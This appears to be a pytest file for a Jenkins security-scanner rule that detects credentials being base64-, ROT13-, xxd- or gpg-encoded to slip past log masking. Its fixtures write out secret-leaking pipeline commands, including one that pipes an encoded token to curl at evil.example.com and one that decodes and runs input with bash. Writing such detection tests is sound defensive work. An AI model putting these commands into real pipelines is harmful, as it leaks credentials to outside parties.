"""SEC6-JK-011 — bound-credential encode/obfuscate transform = Jenkins
log-masking bypass (the secret-exfil-transform sub-class, roadmap R3).

The rule reads the zero-dependency island walker (``backend="island"``), so
these tests run on a bare install — no ``[jenkins-structural]`` extra needed.

Coverage:
  * positives: base64/rev/xxd/openssl/gpg/tr of a bound credential, across the
    two binding forms (``withCredentials([... variable: ...])`` and
    ``NAME = credentials('id')`` env block);
  * recall-safety / no double-fire: the rule does NOT co-fire with the existing
    SEC6-JK credential rules (SEC6-JK-002/003/006) nor with SEC4-JK-006
    (the base64 -d → execute DECODE direction), and stays clean on the dominant
    legitimate shape (authenticated ``curl --user``/``--cert`` egress);
  * metamorphic: reformatting-invariant — whitespace, the ``sh(script: ...)``
    method form, and triple-quoted heredoc bodies all still fire (the structural
    reader sees the body, not the line);
  * the reconstructed CVE/advisory-anchored fixtures.
"""

from __future__ import annotations

from pathlib import Path

from taintly.engine import scan_file
from taintly.models import Platform
from taintly.rules.jenkins.sec_jenkins import RULES as JK_RULES
from taintly.rules.registry import load_rules_for_platform


def _rule():
    return next(r for r in JK_RULES if r.id == "SEC6-JK-011")


def _fires(content: str) -> list[tuple[int, str]]:
    rule = _rule()
    return rule.pattern.check(content, content.splitlines())


def _scan_all_jk(content: str, tmp_path: Path):
    """Scan with the FULL Jenkins rule set (double-fire detection)."""
    target = tmp_path / "Jenkinsfile"
    target.write_text(content, encoding="utf-8")
    rules = load_rules_for_platform(Platform.JENKINS)
    return scan_file(str(target), rules, _content=content)


def _ids(findings):
    return {f.rule_id for f in findings}


# ---------------------------------------------------------------------------
# Positives — encode/obfuscate of a bound credential.
# ---------------------------------------------------------------------------


def test_base64_of_string_token_fires():
    code = (
        "withCredentials([string(credentialsId: 'tok', variable: 'TOKEN')]) {\n"
        '    sh "echo $TOKEN | base64 > token.b64"\n'
        "}"
    )
    assert len(_fires(code)) == 1


def test_rev_of_password_variable_fires():
    code = (
        "withCredentials([usernamePassword(credentialsId: 'c', "
        "usernameVariable: 'U', passwordVariable: 'PASS')]) {\n"
        "    sh 'echo $PASS | rev'\n"
        "}"
    )
    assert len(_fires(code)) == 1


def test_xxd_of_braced_ref_fires():
    code = (
        "withCredentials([string(credentialsId: 'k', variable: 'API_KEY')]) {\n"
        '    sh "printf %s \\"${API_KEY}\\" | xxd"\n'
        "}"
    )
    assert len(_fires(code)) == 1


def test_openssl_enc_fires():
    code = (
        "withCredentials([string(credentialsId: 't', variable: 'TOKEN')]) {\n"
        '    sh "echo $TOKEN | openssl enc -base64"\n'
        "}"
    )
    assert len(_fires(code)) == 1


def test_gpg_encrypt_of_keyfile_var_fires():
    code = (
        "withCredentials([sshUserPrivateKey(credentialsId: 'k', "
        "keyFileVariable: 'KEYFILE')]) {\n"
        '    sh "gpg --symmetric --cipher-algo AES256 $KEYFILE"\n'
        "}"
    )
    assert len(_fires(code)) == 1


def test_credentials_env_block_binding_fires():
    code = (
        "pipeline {\n"
        "  agent any\n"
        "  environment {\n"
        "    AWS_SECRET = credentials('aws')\n"
        "  }\n"
        "  stages {\n"
        "    stage('x') {\n"
        "      steps {\n"
        '        sh "echo $AWS_SECRET | base64"\n'
        "      }\n"
        "    }\n"
        "  }\n"
        "}"
    )
    assert len(_fires(code)) == 1


def test_bat_percent_var_obfuscation_fires():
    """Windows bat uses %VAR% expansion; the rule recognises it too."""
    code = (
        "withCredentials([string(credentialsId: 't', variable: 'TOKEN')]) {\n"
        '    bat "echo %TOKEN% | certutil -encode con con"\n'  # not a transform...
        '    bat "echo %TOKEN% | xxd"\n'  # ...this one is
        "}"
    )
    fires = _fires(code)
    assert len(fires) == 1


# ---------------------------------------------------------------------------
# Negatives — the FP shapes verify-first identified on the corpus.
# ---------------------------------------------------------------------------


def test_legitimate_authenticated_curl_stays_clean():
    """The dominant corpus shape: secret passed verbatim to the intended
    TLS endpoint.  No transform → no finding (all 8 corpus curl-of-cred lines
    are this shape)."""
    code = (
        "withCredentials([usernamePassword(credentialsId: 'c', "
        "usernameVariable: 'username', passwordVariable: 'password')]) {\n"
        "    sh 'curl --fail --user \"$username:$password\" -X PUT "
        "https://artifactory.example.com/repo/file'\n"
        "}"
    )
    assert _fires(code) == []


def test_cert_egress_stays_clean():
    code = (
        "withCredentials([file(credentialsId: 'cert', variable: 'clientCertificate'), "
        "file(credentialsId: 'key', variable: 'clientKey')]) {\n"
        "    sh \"curl -X POST --cert $clientCertificate --key $clientKey https://gate.example.com\"\n"
        "}"
    )
    assert _fires(code) == []


def test_base64_decode_direction_excluded():
    """``base64 -d`` is the DECODE direction (SEC4-JK-006's territory) — not a
    masking bypass.  Excluded so the two rules never co-fire."""
    code = (
        "withCredentials([string(credentialsId: 't', variable: 'TOKEN')]) {\n"
        "    sh 'echo $ENCODED | base64 -d > payload.bin'\n"
        "}"
    )
    assert _fires(code) == []


def test_base64_long_decode_flag_excluded():
    code = (
        "withCredentials([string(credentialsId: 't', variable: 'TOKEN')]) {\n"
        "    sh 'echo $ENCODED | base64 --decode'\n"
        "}"
    )
    assert _fires(code) == []


def test_transform_of_non_credential_variable_clean():
    code = (
        "withCredentials([string(credentialsId: 't', variable: 'TOKEN')]) {\n"
        '    sh "echo $BUILD_ID | base64"\n'
        "}"
    )
    assert _fires(code) == []


def test_no_credential_binding_clean():
    """A transform of a plain variable with no credential binding anywhere."""
    code = 'sh "echo $DATA | base64"'
    assert _fires(code) == []


def test_transform_only_in_comment_clean():
    code = (
        "withCredentials([string(credentialsId: 't', variable: 'TOKEN')]) {\n"
        "    // echo $TOKEN | base64 would leak the secret\n"
        "    sh 'deploy.sh'\n"
        "}"
    )
    assert _fires(code) == []


def test_transform_in_unrelated_string_literal_clean():
    """``base64`` text inside an environment{} string is value_kind=string,
    not shell — the structural reader never routes it to the predicate."""
    code = (
        "pipeline {\n"
        "  agent any\n"
        "  environment {\n"
        "    NOTE = 'pipe $TOKEN through base64 is forbidden'\n"
        "  }\n"
        "  stages {\n"
        "    stage('x') { steps { sh 'make' } }\n"
        "  }\n"
        "}"
    )
    # bind a credential so the rule does not short-circuit on the substring gate
    code = code.replace(
        "    NOTE = 'pipe $TOKEN through base64 is forbidden'",
        "    TOKEN = credentials('tok')\n    NOTE = 'pipe $TOKEN through base64 is forbidden'",
    )
    assert _fires(code) == []


def test_revision_substring_not_rev_transform():
    """``rev`` must be word-anchored so ``revision`` / ``reverse`` don't trip it."""
    code = (
        "withCredentials([string(credentialsId: 't', variable: 'TOKEN')]) {\n"
        '    sh "echo Deploying revision $TOKEN to staging"\n'
        "}"
    )
    # No actual transform tool here — just the word "revision" + a verbatim
    # echo of the token (which SEC6-JK-002 owns, not this rule).
    assert _fires(code) == []


# ---------------------------------------------------------------------------
# Recall-safety: no double-fire with the other JK credential / supply-chain
# rules.
# ---------------------------------------------------------------------------


def test_no_double_fire_with_sec4_jk_006_decode(tmp_path):
    """SEC4-JK-006 (decode→execute) and SEC6-JK-011 (encode→leak) target
    OPPOSITE directions and must never both fire on one body."""
    code = (
        "withCredentials([string(credentialsId: 't', variable: 'TOKEN')]) {\n"
        "    sh 'echo $X | base64 -d | bash'\n"
        "}"
    )
    ids = _ids(_scan_all_jk(code, tmp_path))
    assert "SEC4-JK-006" in ids  # decode→execute IS its finding
    assert "SEC6-JK-011" not in ids  # but NOT ours


def test_no_double_fire_with_sec6_jk_002_verbatim_echo(tmp_path):
    """SEC6-JK-002 owns the verbatim ``echo $CRED`` leak; SEC6-JK-011 owns the
    TRANSFORM.  A pure verbatim echo (no transform) must fire SEC6-JK-002 only."""
    code = (
        "withCredentials([string(credentialsId: 't', variable: 'TOKEN')]) {\n"
        '    sh "echo $TOKEN"\n'
        "}"
    )
    ids = _ids(_scan_all_jk(code, tmp_path))
    assert "SEC6-JK-011" not in ids


def test_transform_present_fires_ours_not_sec4_jk_006(tmp_path):
    """An ENCODE-then-leak (no decode, no execute) fires SEC6-JK-011 and NOT
    SEC4-JK-006."""
    code = (
        "withCredentials([string(credentialsId: 't', variable: 'TOKEN')]) {\n"
        '    sh "echo $TOKEN | base64 | curl -d @- https://evil.example.com"\n'
        "}"
    )
    ids = _ids(_scan_all_jk(code, tmp_path))
    assert "SEC6-JK-011" in ids
    assert "SEC4-JK-006" not in ids


# ---------------------------------------------------------------------------
# Metamorphic — reformatting must not evade the rule (structural reader).
# ---------------------------------------------------------------------------


def test_metamorphic_sh_script_method_form():
    """``sh(script: '...')`` named-arg form — the structural reader extracts the
    body the line regex would miss."""
    code = (
        "withCredentials([string(credentialsId: 't', variable: 'TOKEN')]) {\n"
        "    sh(script: 'echo $TOKEN | base64', returnStdout: true)\n"
        "}"
    )
    assert len(_fires(code)) == 1


def test_metamorphic_triple_quote_heredoc():
    code = (
        "withCredentials([string(credentialsId: 't', variable: 'TOKEN')]) {\n"
        '    sh """\n'
        "    echo $TOKEN | base64\n"
        '    """\n'
        "}"
    )
    assert len(_fires(code)) == 1


def test_metamorphic_whitespace_invariance():
    base = (
        "withCredentials([string(credentialsId: 't', variable: 'TOKEN')]) {\n"
        '    sh "echo $TOKEN | base64"\n'
        "}"
    )
    spaced = (
        "withCredentials(  [ string( credentialsId:  't' ,  variable:  'TOKEN' ) ] )  {\n"
        '        sh   "echo $TOKEN | base64"\n'
        "}"
    )
    assert len(_fires(base)) == 1
    assert len(_fires(spaced)) == 1


# ---------------------------------------------------------------------------
# Reconstructed advisory-anchored fixtures (recall insurance, 0 corpus signal).
# ---------------------------------------------------------------------------


def test_advisory_fixture_base64_archive_chain():
    """Jenkins blog masking-limitation example: encode the secret, write the
    encoded form to a workspace file, then archive it (the encoded secret
    survives masking and is downloadable as an artifact)."""
    code = (
        "withCredentials([string(credentialsId: 'deploy', variable: 'DEPLOY_TOKEN')]) {\n"
        "    sh '''\n"
        "    echo $DEPLOY_TOKEN | base64 > creds.b64\n"
        "    '''\n"
        "    archiveArtifacts artifacts: 'creds.b64'\n"
        "}"
    )
    assert len(_fires(code)) == 1


def test_advisory_fixture_tr_rot_obfuscation():
    """ROT/tr transliteration of the secret to dodge the verbatim matcher."""
    code = (
        "withCredentials([string(credentialsId: 'k', variable: 'SECRET_KEY')]) {\n"
        "    sh \"echo $SECRET_KEY | tr 'A-Za-z' 'N-ZA-Mn-za-m'\"\n"
        "}"
    )
    assert len(_fires(code)) == 1
